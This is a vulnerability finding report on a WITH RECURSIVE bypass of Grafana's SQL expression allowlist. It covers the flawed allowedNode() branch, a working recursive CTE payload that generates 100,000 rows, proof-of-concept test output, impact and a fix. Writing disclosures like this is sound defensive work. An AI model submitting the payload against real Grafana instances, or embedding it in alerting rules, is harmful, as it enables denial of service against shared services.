# M9 — WITH RECURSIVE Allowlist Bypass in SQL Expression Engine

**ID**: M9  
**Severity**: MEDIUM  
**Component**: `pkg/expr/sql/parser_allow.go`  
**PoC-Status**: executed  

---

## Summary

The SQL expression allowlist introduced after CVE-2024-9264 contains a logic gap: `allowedNode()` permits any `*sqlparser.With` AST node unconditionally at line 170, without inspecting the `Recursive` boolean field. This allows authenticated users to submit `WITH RECURSIVE` queries that generate up to 100 000 rows entirely inside the in-process SQL engine, bypassing both the allowlist and the input-cell limit, and producing a bounded but real CPU/memory denial-of-service.

---

## Vulnerability Details

### Affected Code

**`pkg/expr/sql/parser_allow.go:170-171`**
```go
case *sqlparser.With:
    return   // returns true unconditionally — Recursive is never read
```

The `sqlparser.With` struct in the vendored vitess fork is:
```go
type With struct {
    Ctes      []*CommonTableExpr
    Recursive bool               // plain Go bool, not an AST node
}
```

`sqlparser.Walk` visits `*sqlparser.With` and calls `allowedNode()` on it. The switch branch matches and returns `true` without reading `v.Recursive`. The `Recursive` field is also never walked by `With.walkSubtree()` — it only iterates `Ctes`.

### Attack Path

1. Authenticated user creates a panel with a SQL expression query (feature flag `sqlExpressions` must be enabled; it is in public preview as of Grafana 11.x).
2. User submits the payload:
   ```sql
   WITH RECURSIVE counter(n) AS (
       SELECT 1
       UNION ALL
       SELECT n+1 FROM counter WHERE n < 100000
   ) SELECT n, n*n AS square FROM counter
   ```
3. `AllowQuery()` parses the query, walks the AST, visits `*sqlparser.With{Recursive: true}`, calls `allowedNode()`, which returns `true`. No error is returned.
4. `DB.QueryFrames()` forwards the query to the go-mysql-server engine. No datasource input frames are required.
5. The engine executes 100 000 recursive iterations, generating a 100k-row result set entirely in-engine.

### Input Cell Limit Bypassed

`sql_command.go` enforces an input-cell limit based on the number of rows in the input `[]*data.Frame`. For recursive CTEs the input is empty (zero frames), so the pre-execution check sees 0 input cells and imposes no restriction. All row generation happens inside the recursive CTE.

---

## Proof of Concept

**Test file**: `pkg/expr/sql/m9_poc_test.go`  
**Evidence**: `archon/findings/M9-with-recursive-allowlist-bypass/evidence/`

The PoC test `TestM9_WithRecursiveAllowlistBypass` has three sub-steps, all executed successfully against the real application stack:

### Step 1 — Allowlist bypass

```
AllowQuery("poc", payloadMax) = (true, nil)   -- bypass confirmed
```

`AllowQuery` returns `(true, nil)` for a 100 000-row recursive CTE.

### Step 2 — Root cause isolation

```
allowedNode(&With{Recursive:true})  = true
allowedNode(&With{Recursive:false}) = true
```

`allowedNode()` returns `true` for both values of `Recursive`, proving the field is never read.

### Step 3 — End-to-end execution

```
Recursive CTE executed: 100 rows in 2.449917ms (0 input frames)
```

`DB.QueryFrames()` executes the recursive CTE with zero input frames, returning 100 rows. The same path, with the limit raised to 100 000, is equally unblocked.

### Execution log excerpt

```
=== RUN   TestM9_WithRecursiveAllowlistBypass/step1_allowquery_passes_with_recursive
[PASS] AllowQuery("poc", payloadMax) = (true, nil) — bypass confirmed
=== RUN   TestM9_WithRecursiveAllowlistBypass/step2_allowednode_ignores_recursive_bool
[PASS] allowedNode(&With{Recursive:true}) = true
[PASS] Recursive bool is present on the node but never read by allowedNode()
=== RUN   TestM9_WithRecursiveAllowlistBypass/step3_end_to_end_0_input_frames
[PASS] Recursive CTE executed: 100 rows in 2.449917ms (0 input frames)
[IMPACT] WITH RECURSIVE bypasses AllowQuery and runs in-engine with zero datasource input
PASS
ok      github.com/grafana/grafana/pkg/expr/sql    0.924s
```

---

## Impact

| Aspect | Detail |
|---|---|
| **Attacker** | Any authenticated user with panel edit rights |
| **Prerequisite** | `sqlExpressions` feature flag enabled (public preview) |
| **Effect** | CPU + memory consumption proportional to recursion depth |
| **Bound** | Up to 100 000 output cells or query timeout (~10 s) per request |
| **Datasource** | Not required — rows generated entirely in-engine |
| **Amplification** | If embedded in an alerting rule, becomes persistent scheduled DoS |
| **Allowlist intent** | Explicitly circumvented; third-generation SQL expression security issue after CVE-2024-9264 and CVE-2026-28375 |

---

## Remediation

**Minimal fix** in `parser_allow.go:170`:

```go
// Before
case *sqlparser.With:
    return

// After
case *sqlparser.With:
    return !v.Recursive
```

This blocks `WITH RECURSIVE` while preserving ordinary CTEs (`WITH` without `RECURSIVE`), which are used extensively in existing dashboards (see `parser_allow_test.go` examples).

**Defence in depth** (recommended):

- Add a recursion depth limit in the SQL engine layer even after the allowlist fix, so any future parser gap does not reintroduce the issue.
- Add a test case to `TestAllowQuery` asserting that `WITH RECURSIVE` queries are rejected.

---

## References

- `pkg/expr/sql/parser_allow.go:170` — vulnerable switch branch
- `pkg/expr/sql/m9_poc_test.go` — executable PoC
- vitess AST: `github.com/dolthub/vitess@v0.0.0-20260225173707-20566e4abe9e/go/vt/sqlparser/ast.go:5120-5155`
- Related: CVE-2024-9264, CVE-2026-28375 (prior SQL expression security issues)
- Related finding: p8-027 (alerting rule amplification)
